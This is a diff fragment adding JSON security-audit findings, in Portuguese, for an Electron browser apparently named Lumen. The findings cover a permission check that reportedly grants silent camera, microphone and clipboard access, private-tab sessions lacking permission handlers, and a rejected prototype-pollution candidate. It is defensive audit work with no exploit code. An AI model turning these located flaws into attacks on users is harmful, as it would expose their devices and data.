+        "reason": "Qualquer página HTTPS basta; não é preciso interação adicional, mas a vítima precisa navegar até a origem do atacante."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Acesso silencioso a câmera e microfone e leitura da área de transferência, derrotando por completo o controle explícito de consentimento."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "A expressão de decisão está integralmente no código-fonte (main.js:553-571) e não depende de configuração externa."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "lumen/private-session-no-permission-policy",
+    "title": "Sessão privada (lumen-private) não recebe handler de permissão nem de checagem, ao contrário da sessão padrão",
+    "description": "A partição lumen-private é criada e recebe apenas wireDownloads; os handlers de permissão são registrados exclusivamente em session.defaultSession (main.js:553-571). Como a política de permissões é por sessão, todo guest de aba privada fica sem a política explícita do app e cai no comportamento padrão da sessão do Electron, que não é definido no repositório. O resultado depende de um fato de runtime que não está no código-fonte.",
+    "claimed_root_cause": "As chamadas setPermissionRequestHandler/setPermissionCheckHandler estão acopladas a session.defaultSession em vez de serem aplicadas a todas as sessões usadas pelo app (default e lumen-private).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 547,
+        "scope": "main",
+        "description": "const priv = session.fromPartition('lumen-private'); apenas wireDownloads(priv) é aplicado"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/renderer/shell.js",
+        "line": 232,
+        "scope": "renderer",
+        "description": "webview.setAttribute('partition', 'lumen-private') direciona o guest para a sessão privada"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 553,
+        "scope": "main",
+        "description": "A política restritiva é registrada somente em session.defaultSession"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 546,
+        "description": "O bloco da partição privada contém apenas wireDownloads(priv)"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 568,
+        "description": "setPermissionCheckHandler também só existe para defaultSession"
+      }
+    ],
+    "blockers": [
+      "Não é possível determinar pelo código-fonte qual é a política padrão do Electron 45 para uma sessão sem setPermissionRequestHandler/setPermissionCheckHandler; a documentação local (node_modules/electron/electron.d.ts) descreve a assinatura, mas não o comportamento default.",
+      "A verificação decisiva exige executar o app em sandbox com uma página de teste (getUserMedia/geolocation) em aba privada, o que não foi feito nesta auditoria."
+    ],
+    "validation_plan": {
+      "local": "Em sandbox de OS com rede loopback: sirva uma página em http://127.0.0.1 que chame getUserMedia e geolocation, abra em aba privada no Lumen instrumentado com CDP e verifique se o pedido é concedido sem prompt (e se há log do handler ausente).",
+      "deployment": "Confirmar no changelog do Electron 45 se sessões sem handler concedem por padrão; se concederem, a política de abas privadas deve ser equiparada à da sessão padrão."
+    }
+  },
+  {
+    "verdict": "rejected",
+    "fingerprint": "lumen/settings-json-prototype-pollution",
+    "title": "Possível poluição de protótipo via settings.json local",
+    "description": "Candidate: Object.assign({}, DEFAULTS, readJSON('settings.json', {})) copiaria uma chave __proto__ presente no arquivo para o protótipo do objeto settings.",
+    "claimed_root_cause": "Leitura de JSON local sem filtrar chaves especiais antes do Object.assign.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/store.js",
+        "line": 82,
+        "scope": "main",
+        "description": "settings é montado com Object.assign a partir do conteúdo de settings.json"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 212,
+        "description": "settings:set só aceita chaves de uma allowlist fixa, portanto __proto__ não entra via IPC"
+      },
+      {
+        "file": "src/main/store.js",
+        "line": 104,
+        "description": "As leituras devolvem apenas o objeto settings local, sem alcance a outros contextos"
+      }
+    ],
+    "reason": "O único principal capaz de escrever settings.json é um atacante local que já possui escrita no perfil do usuário — o mesmo poder que o suposto achado concederia. Não há travessia de fronteira: o efeito é sobre a própria configuração local, sem ganho de privilégio nem alcance a outro principal. Rejeitado como achado de segurança."
+  }
+]
